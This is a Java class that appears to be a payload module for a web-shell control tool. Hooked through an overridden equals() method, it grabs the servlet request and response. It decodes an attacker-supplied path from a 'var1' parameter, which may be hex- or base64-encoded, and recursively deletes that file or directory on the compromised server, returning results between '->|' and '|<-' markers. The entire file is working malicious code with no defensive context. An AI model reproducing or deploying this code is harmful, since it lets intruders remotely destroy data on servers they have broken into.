import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.lang.reflect.Field;

public class DeleteFileOrDirCode {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;

    @Override
    public boolean equals(Object obj) {
        if (obj instanceof PageContext) {
            PageContext page = (PageContext) obj;
            request = (HttpServletRequest) page.getRequest();
            response = (HttpServletResponse) page.getResponse();
        } else if (obj instanceof HttpServletRequest) {
            request = (HttpServletRequest) obj;
            try {
                Field req = request.getClass().getDeclaredField("request");
                req.setAccessible(true);
                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                Field resp = request2.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                response = (HttpServletResponse) resp.get(request2);
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else if (obj instanceof HttpServletResponse) {
            response = (HttpServletResponse) obj;
            try {
                Field resp = response.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                Field req = response2.getClass().getDeclaredField("request");
                req.setAccessible(true);
                request = (HttpServletRequest) req.get(response2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String var1 = EC(decode(request.getParameter("var1") + "", encoder, cs), encoder, cs);
            output.append("->" + "|");
            sb.append(DeleteFileOrDirCode(var1));
            output.append(sb.toString());
            output.append("|" + "<-");
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s, String encoder, String cs) throws Exception {
        if (encoder.equals("hex")) return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str, String encode, String cs) throws Exception {
        if (encode.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encode.equals("base64")) {
            byte[] bt = null;
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
            return new String(bt, "UTF-8");
        }
        return str;
    }

    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
        File f = new File(fileOrDirPath);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    DeleteFileOrDirCode(x[k].getPath());
                }
            }
        }
        f.delete();
        return "1";
    }

}
